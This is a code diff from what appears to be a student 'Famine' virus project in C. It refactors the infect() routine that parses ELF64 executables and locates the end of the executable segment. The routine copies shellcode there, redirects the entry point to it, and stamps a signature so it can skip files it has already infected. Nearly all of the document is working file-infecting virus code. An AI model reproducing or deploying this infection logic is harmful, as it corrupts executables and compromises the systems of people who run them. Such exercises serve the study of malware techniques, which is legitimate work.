@@ -6,16 +6,14 @@
 /*   By: nguiard <marvin@42.fr>                     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2024/10/31 10:47:01 by nguiard           #+#    #+#             */
-/*   Updated: 2024/11/05 12:16:43 by nguiard          ###   ########.fr       */
+/*   Updated: 2024/11/05 12:45:55 by nguiard          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
 #include "famine.h"
 
-static bool		parsing(byte *file, const struct stat file_stat, size_t size_sign_off, elf_data *data);
+static bool		parsing(byte *file, const struct stat file_stat, profiling *this, elf_data *data);
 static size_t	off_end_exec_segment(elf_data *data);
-
-#define	CODE_SIZE		0xa6b - 0x30 + 1
 
 //	Infects the file located at path
 //
@@ -41,7 +39,6 @@ bool	infect(profiling *this, const str path) {
 		printf(FILE_LINE("fstat failed: %ld\n"), ret);
 	}
 
-
 	if (file_stat.st_size < (long int)sizeof(Elf64_Ehdr))
 		goto infect_end;
 
@@ -53,7 +50,7 @@ bool	infect(profiling *this, const str path) {
 	}
 
 	// Logic starts
-	if (parsing(file_origin, file_stat, this->size + SIGNATURE_OFFSET, &data) == false) {
+	if (parsing(file_origin, file_stat, this, &data) == false) {
 		printf("%s is already infected or not compatible\n", path);
 		goto infect_end;
 	}
@@ -68,7 +65,6 @@ bool	infect(profiling *this, const str path) {
 					"\xff\xd0";
 
 	size_t	entry_off = data.original_entry_point - data.infection_offset - 0x13;
-	printf("%ld = %lx - %lx\n", (long)entry_off, data.original_entry_point, data.infection_offset);
 
 	ft_memcpy(file_origin + data.infection_offset, (byte *)shellcode, 24);
 
@@ -78,7 +74,7 @@ bool	infect(profiling *this, const str path) {
 
 	data.elf->e_entry = data.infection_offset;
 
-	ft_memcpy(file_origin + data.infection_offset + this->size + SIGNATURE_OFFSET, (byte *)SIGNATURE, SIGNATURE_LEN);
+	ft_memcpy(file_origin + data.infection_offset + this->size + SIGNATURE_OFFSET, this->signature, SIGNATURE_LEN);
 	printf("Written %s at 0x%lx\n", file_origin + data.infection_offset + this->size + SIGNATURE_OFFSET,
 		data.infection_offset + this->size + SIGNATURE_OFFSET);
 
@@ -94,7 +90,7 @@ bool	infect(profiling *this, const str path) {
 //
 //	Returns true if it's compatible
 //	Returns false if it's not
-static bool	parsing(byte *file, const struct stat file_stat, size_t size_sign_off, elf_data *data) {
+static bool	parsing(byte *file, const struct stat file_stat, profiling *this, elf_data *data) {
 	(void)file_stat;
 
 	if (((uint32_t *)file)[0] != 0x464c457f)
@@ -111,10 +107,10 @@ static bool	parsing(byte *file, const struct stat file_stat, size_t size_sign_of
 	data->sections = (Elf64_Shdr *)(file + data->elf->e_shoff);
 	data->segments = (Elf64_Phdr *)(file + data->elf->e_phoff);
 	data->infection_offset = off_end_exec_segment(data);
-	data->signature_offset = data->infection_offset + size_sign_off;
+	data->signature_offset = data->infection_offset + this->size + SIGNATURE_OFFSET;
 	data->original_entry_point = data->elf->e_entry;
 
-	if (ft_memcmp((const byte *)SIGNATURE, file + data->signature_offset, SIGNATURE_LEN) == true) {
+	if (ft_memcmp(this->signature, file + data->signature_offset, SIGNATURE_LEN) == true) {
 		printf("INFECTED !\n");
 		return false;
 	}
